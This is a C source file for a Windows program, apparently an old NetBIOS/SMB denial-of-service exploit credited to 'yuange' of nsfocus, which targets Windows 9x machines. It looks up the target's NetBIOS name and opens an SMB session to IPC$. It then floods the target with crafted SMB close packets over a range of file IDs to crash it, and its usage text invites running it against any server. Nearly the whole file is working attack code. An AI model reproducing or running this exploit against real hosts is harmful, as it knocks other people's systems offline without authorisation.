#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char **argv)
{
char *server;
char buff[1000];
char buff2[1000];
char buffgetname[]=
{0x00,0x72,0x00,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x43,0x4b,0x41,
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00,0x00,0x21,
0x00,0x01};
char name;
char myname[0x200]={"hello"};
char servername[]={"*SMBSERVER"};
char buff3[]=
{0x81,0,0,0x44,0x20,0x45,0x4f,0x45,0x42,0x45,0x4a,0x43,0x48,0x46,0x44,0x43,0x41,
0x46,0x48,0x45,0x50,0x46,0x43,0x45,0x4d,0x45,0x45,0x43,0x41,0x43,0x41,0x43,0x41,
0x43,0x41,0x43,0x41,00,0x20,0x45,0x48,0x46,0x46,0x45,0x46,0x46,0x44,0x46,0x45,
0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
0x43,0x41,0x43,0x41,0x41,0x41,00
};
char buff4[]={
0x0,0x0,0x0,0x9a,0xff,0x53,0x4d,0x42,0x72,00,00, 00, 00, 00, 00, 00, 00, 00,
00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00 ,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x77,0x00,0x02,0x50,0x43,0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x20,0x50,
0x52,0x4f,0x47,0x52,0x41,0x4d,0x20,0x31,0x2e,0x30,0x00,0x02,0x4d,0x49,0x43,0x52,
0x4f,0x53,0x4f,0x46,0x54,0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x53,0x20,0x33,
0x2e,0x30,0x00,0x02,0x44,0x4f,0x53,0x20,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,
0x32,0x00,0x02,0x44,0x4f,0x53,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,
0x00,0x02,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x66,0x6f,0x72,0x20,0x57,0x6f,
0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,0x73,0x20,0x33,0x2e,0x31,0x61,0x00,0x02,0x4e,
0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0
};
int fileid_begin=0x600;
int fileid_end=0x8ff;
char smbchr[]={"SMBr"};
char namereturn[]={0x82,0,0,0,0};
char ipaddr[]={"192.168.1.1"};
char ipaddrbak[]={"127.0.0.1"};

int port,gethost;
int fd,fd2;

struct sockaddr_in s_in,s_in2,s_in3;
struct linger time_out;
struct hostent *he;
int i,j,k;
SOCKET d_ip;
WSADATA wsaData;
int result= WSAStartup(MAKEWORD(1, 1), &wsaData);
if (result != 0) {
        fprintf(stderr, "Your computer was not connected "
            "to the Internet at the time that "
            "this program was launched, or you "
            "do not have a 32-bit "
            "connection to the Internet.");
        exit(1);
    }


if(argc <2)
{
WSACleanup( );
    fprintf(stderr,"\n nuke win9x netbios .\n copy by yuange(yuange@nsfocus.com) 2000.4.1. \n
                       wellcome to our homepage http://www.nsfocus.com .");
    fprintf(stderr, "\n usage: %s <server> [port] \n", argv[0]);
exit(1);
}
if(argc>=2)
server = argv[1];
else server=&ipaddr;
d_ip = inet_addr(server);

if(d_ip==-1){
he = gethostbyname(server);
if(!he)
{
WSACleanup( );
    printf("\n Can't get the ip of %s !\n",server);
exit(1);
    }
    else memcpy(&d_ip, he->h_addr, 4);

}
if(argc>2) port = atoi(argv[2]);
else port=139;

fd = socket(AF_INET, SOCK_STREAM,0);
i=8000;
setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&i,sizeof(i));

s_in.sin_family = AF_INET;
s_in.sin_port = htons(port);
s_in.sin_addr.s_addr = d_ip;
printf("\n nuke ip: %s port %d",inet_ntoa(s_in.sin_addr),htons(s_in.sin_port));

if(!connect(fd, (struct sockaddr *)&s_in, sizeof(struct sockaddr_in))){

fd2 = socket(AF_INET, SOCK_DGRAM,0);
    i=8000;
    setsockopt(fd2,SOL_SOCKET,SO_RCVTIMEO,&i,sizeof(i));

s_in2.sin_family = AF_INET;
s_in2.sin_port = htons(500);
s_in2.sin_addr.s_addr =0;

    s_in3.sin_family = AF_INET;
s_in3.sin_port = htons(137);
s_in3.sin_addr.s_addr = d_ip;
    bind(fd2,&s_in2, sizeof(struct sockaddr_in));
for(k=0;k<10;++k){
        printf("\n connect the smb %d times",k+1);
sendto(fd2,buffgetname,0x32,0,&s_in3,sizeof(struct sockaddr_in));
        i= sizeof(struct sockaddr_in);

        for(i=0;i<520;++i) buff2[i]=0;
    j=recvfrom(fd2,buff2,500,0,&s_in3,&i);
        i=0x39;
        while(i<j){
            if(buff2[i+0x0f]==0x20) {
                memcpy(servername,buff2+i,0x40);
                break;
            }
            i+=0x12;
        }

        if(i>=j){
        he=gethostbyaddr(&d_ip,sizeof(d_ip),PF_INET);
    if(he) memcpy(servername,he->h_name,0x40);
        }
        printf("\n server computername: %s",servername);

    gethost=0;
    for(i=0;i<16;++i){
        name=servername[i] ;
        if(name==0) gethost=1;
        if(gethost==1) name=0x20;
        buff3[2*i+5]= ( (name >> 4) & 0x000F ) + 'A';
        buff3[2*i+6]= (name & 0x000F) + 'A';
        }
    buff3[37]=0;
    gethost=0;
    for(i=0;i<16;++i){
            name=servername[i];
            if(name==0) gethost=1;
        if(gethost==1) name=0x20;
        buff3[2*i+39]= ( (name >> 4) & 0x000F ) + 'A';
        buff3[2*i+40]= (name & 0x000F) + 'A';

        }
    buff3[71]=0;

    i=send(fd,buff3,0x48,0);
    printf("\n send name packet %d bytes",i);
    buff2[0]=0;
    buff2[1]=0;
    buff2[2]=0;
    buff2[3]=0;
    buff2[4]=0;
    i=recv(fd,buff2,600,0);
    printf("\n recv :");
    if(i>0){
            for(j=0;j<i;++j) {
                name=(char * )buff2[j];
                printf("%d ",name);
            }
        }
        if(memcmp(buff2,namereturn,4)==0) k=100;
    }

    closesocket(fd2);
    if(k<100){
    printf("\n Can't Negative! \n");
closesocket(fd);
    WSACleanup( );
exit(1);
    }
    buff4[0]=0;
    buff4[1]=0;
    buff4[2]=0;
    buff4[3]=0x9a;
    buff4[4]=0xff;
    buff4[5]='S';
    buff4[6]='M';
    buff4[7]='B';
    buff4[8]=0x72;
    buff4[0x25]=0x77;
    j=send(fd,buff4,0x9e,0);
        printf("\n send smb 0x72 packet %d bytes",j);


        buff2[4]=0;
        buff2[5]=0;
        buff2[6]=0;
        j=recv(fd,buff2,600,0);
        printf("\n recv packet %d bytes:\n",j);
        if(strcmp(buff2+5,smbchr)!=0){
            printf("\n Can't login \\\\%s\\ipc$! \n",inet_ntoa(s_in.sin_addr));
        closesocket(fd);
        WSACleanup( );
        exit(1);
        }
        name=buff2[0x27];
        name&=0x01;
        if(name==1){
        printf("\n Only can nuke win9x system,can't nuke winnt system.\n");
        closesocket(fd);
        WSACleanup( );
        exit(1);
        }

        printf("\nBegin smb packet nuke !");

/* snd smb 0x73 packet */
for(i=0;i<400;++i) buff[i]=0;
    buff[0]=0;
    buff[1]=0;
    buff[2]=0;
    buff[3]=0x9e+strlen(servername);
    buff[4]=0xff;
    buff[5]='S';
    buff[6]='M';
    buff[7]='B';
    buff[8]=0x73;
    buff[0x24]=0x0d;
    buff[0x25]=0x75;
    buff[0x27]=0x86;
    buff[0x29]=0x68;
    buff[0x2a]=0x0b;
    buff[0x2b]=0x32;
    buff[0x33]=0x18;
    buff[0x3b]=0x05;
    buff[0x3f]=0x49;
    buff[0x59]=0x41;
    buff[0x5a]=0x44;
    buff[0x5b]=0x4d;
    buff[0x5c]=0x49;
    buff[0x5d]=0x4e;
    buff[0x4e]=0x49;
    buff[0x4f]=0x53;
    buff[0x50]=0x54;
    buff[0x51]=0x52;
    buff[0x52]=0x41;
    buff[0x53]=0x54;
    buff[0x54]=0x4f;
    buff[0x55]=0x52;

    buff[0x8a]=0x04;
    buff[0x8b]=0xff;
    buff[0x8f]=0x02;
    buff[0x91]=1;

    buff[0x93]=13+strlen(servername);
    buff[0x96]=0x5c;
    buff[0x97]=0x5c;

        strcpy(buff+0x98,servername);
        strcpy(buff+0x98+strlen(servername),"\\IPC$");
        strcpy(buff+0x9e+strlen(servername),"IPC");

        j=send(fd,buff,0xa2+strlen(servername),0);
        printf("\n send smb 0x73 packet %d bytes",j);

        j=recv(fd,buff2,600,0);
        printf("\n recv packet %d bytes",j);


/* send smb 0x34 packet */
    for(i=0;i<400;++i) buff[i]=0;
        buff[0]=0;
    buff[1]=0;
    buff[2]=0;
    buff[3]=0x25;
    buff[4]=0xff;
    buff[5]='S';
    buff[6]='M';
    buff[7]='B';
    buff[8]=0x34;
    buff[0x24]=0x01;
    for(i=fileid_begin;i<fileid_end;++i){
        buff[0x25]=i%0x100;
        buff[0x26]=i/0x100;
        j=send(fd,buff,0x29,0);
        printf("\n send smb 0x34 packet long %d",j);
            printf(" FileId: %d",i);
        }
}
else printf("\n connect err !\n");

closesocket(fd);
WSACleanup( );
return(0);
}

